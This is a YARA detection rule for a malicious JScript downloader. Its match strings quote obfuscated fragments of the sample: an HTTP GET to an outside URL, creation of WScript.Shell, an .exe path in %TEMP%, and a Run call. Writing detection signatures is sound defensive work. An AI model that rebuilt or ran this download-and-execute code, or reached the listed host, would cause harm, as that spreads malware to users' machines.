rule sig_20160401_c09c0c0f4450ce0d58f21374545c8956 {
  meta:
    description = "datamaliciousorder - file 20160401_c09c0c0f4450ce0d58f21374545c8956.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c32a067777d7a219edd9044a0595c2456c75a6501c4c11cfa2b8a8c064925109"

  strings:
    $s1  = "EcYl[RdpDwm](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "var QdyJg = function CvHb() {return WScript[ZdbMm](\"WScript\"+\".Shell\");}(), QyIp = 11;" fullword ascii
    $s3  = "function TuqLs(NbrKe, PoDe){LbUis = LbUis * 1; return NbrKe - PoDe;};" fullword ascii
    $s4  = "if (EcYl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CopBnj() {return QdyJg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"v8ncQUBzd7oN.ex\" + \"e\";};" fullword ascii
    $s6  = "function YmOs(){return MlGxs + \"\";};" fullword ascii
    $s7  = "function YddLfz() {return ((BhBl == true) && (BhBl == PbeVu)) ? 1 : LbUis;};" fullword ascii
    $s8  = "BhBl = true; " fullword ascii
    $s9  = "function AaKfu(){return ZdbMm;};" fullword ascii
    $s10 = "var PbeVu = false;" fullword ascii
    $s11 = "var EiYe = false;" fullword ascii
    $s12 = "function KkfHkb(FgZqt) {var OmaYwk = (1, 2, 3, 4, 5, FgZqt); return OmaYwk;};" fullword ascii
    $s13 = "PbeVu = true; " fullword ascii
    $s14 = "function HrlQgv(JfXvo){QdyJg[\"R\"+\"un\"](JfXvo, LbUis, LbUis);};" fullword ascii
    $s15 = "}while (AwQa);" fullword ascii
    $s16 = "function EaFvs(){return 23;};" fullword ascii
    $s17 = "return TuqLs(MvNn, SbPt);" fullword ascii
    $s18 = "var BhBl = false;" fullword ascii
    $s19 = "function RzYs()" fullword ascii
    $s20 = "var EfXz = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}